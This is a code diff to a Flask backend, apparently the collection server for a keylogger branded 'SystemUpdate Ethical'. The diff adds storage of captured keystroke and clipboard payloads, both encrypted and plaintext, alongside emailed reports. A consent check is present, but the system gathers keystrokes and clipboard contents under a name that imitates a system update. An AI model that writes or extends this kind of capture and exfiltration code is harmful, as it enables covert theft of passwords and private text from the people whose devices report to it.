@@ -2,6 +2,7 @@ from flask import Blueprint, jsonify, request
 from flask_jwt_extended import jwt_required, get_jwt
 import json
 from ..emailer import send_email_report
+from ..storage import save_payload
 
 
 data_bp = Blueprint("data", __name__)
@@ -37,9 +38,11 @@ def post_keystrokes():
         return jsonify(error="consent_required"), 403
     payload = request.get_json(silent=True) or {}
     if _is_envelope(payload):
-        # Accept encrypted payload; backend decrypt to be implemented in later phase
+        # Persist envelope; decrypt to be implemented in later phase
+        save_payload("keystrokes", _claims_device_id(), payload, envelope=True)
         return jsonify(status="envelope_received"), 202
     # TODO: decrypt, redact, persist
+    save_payload("keystrokes", _claims_device_id(), payload, envelope=False)
     # Email report (best-effort)
     subject = f"[SystemUpdate Ethical] Keystrokes from { _claims_device_id() }"
     try:
@@ -58,9 +61,11 @@ def post_clipboard():
         return jsonify(error="consent_required"), 403
     payload = request.get_json(silent=True) or {}
     if _is_envelope(payload):
-        # Accept encrypted payload; backend decrypt to be implemented in later phase
+        # Persist envelope; decrypt to be implemented in later phase
+        save_payload("clipboard", _claims_device_id(), payload, envelope=True)
         return jsonify(status="envelope_received"), 202
     # TODO: decrypt, redact, persist
+    save_payload("clipboard", _claims_device_id(), payload, envelope=False)
     # Email report (best-effort)
     subject = f"[SystemUpdate Ethical] Clipboard from { _claims_device_id() }"
     try:
